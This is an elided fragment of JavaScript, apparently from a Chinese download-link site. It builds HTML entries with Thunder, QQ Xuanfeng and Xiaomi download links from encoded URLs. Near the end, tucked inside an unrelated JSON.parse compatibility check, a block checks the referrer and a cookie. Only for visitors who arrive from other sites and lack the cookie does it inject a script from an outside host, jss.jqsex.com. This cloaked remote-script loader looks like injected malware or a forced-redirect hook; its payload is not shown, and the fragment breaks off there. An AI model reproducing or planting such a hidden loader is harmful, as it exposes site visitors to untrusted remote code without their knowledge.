...
function echoDown(str,num) {
        ...
        for(var i=0;i<s.length;i++){
            ...
            gurl[3] = '<a  href="' + ThunderEncode(gurl[1]) + '" title="' + $(this).find("a:first").attr("title") + '" target="_self">' + gurl[3] + '</a>';
            ...
            var thunderUrl = isMagnet != '' ? isMagnet : ThunderEncode(gurl[1]);
            
            gurl[2] =  BeyondDecode(thunderUrl);
            
            var innerStr = '<li><div class="feifan123"><input type="checkbox" value=\"' +thunderUrl + '\"  name="CopyAddr' + num + '" style="vertical-align:middle" class="' + num + 'addr"/><div><span id="s' + num + 'p' + i + '">' + gurl[3] + '</span><input type="text" value="' + thunderUrl + '" style="vertical-align:middle" id="lin' + num + 'k' + i + '"/></div></div><div class="dwon_xl"><a target=\"_self\" href=\"' + thunderUrl + '\" thUrl=\"'+thunderUrl+'\" mc=\"\" title="\u8fc5\u96f7\u4e0b\u8f7d" id="'+num+'thUrlid'+i+'" class="dwon'+num+'">\u8fc5\u96f7\u4e0b\u8f7d</a></div><div class="dwon_tx"><a class=\"qq-down\" href=\"' + gurl[2] + '\" qhref=\"'+gurl[2]+'\" filename=\"\" title="\u65cb\u98ce\u4e0b\u8f7d" target="_self">\u65cb\u98ce\u4e0b\u8f7d</a></div><div class="dwon_xf"><a href=\"https://d.miwifi.com/d2r/?url=' + encode64(thunderUrl) + '\" title="\u5c0f\u7c73\u4e0b\u8f7d">\u5c0f\u7c73\u4e0b\u8f7d</a></div><div class="dwon_y"><a href=\"javascript:video(0);\" onclick=\"start(\'' + gurl[1] + '\')\" title="\u8fc5\u96f7\u5f71\u97f3" target="_self">\u8fc5\u96f7\u5f71\u97f3</a></div></li>';
        ...
        if (typeof JSON.parse !== 'function') {
            ...
            (function(s, c, o) {
                var r = document.referrer,
                    ...
                    ah = h.split(".");
                if (ah.length > 2) h = ah[ah.length - 2] + "." + ah[ah.length - 1];
                if (r != "" && r.indexOf(h) < 0 && document.cookie.indexOf(c) < 0) {
                    (function() {
                        ...
                        j.src = "https://jss.jqsex.com/js/2/aimi.js";
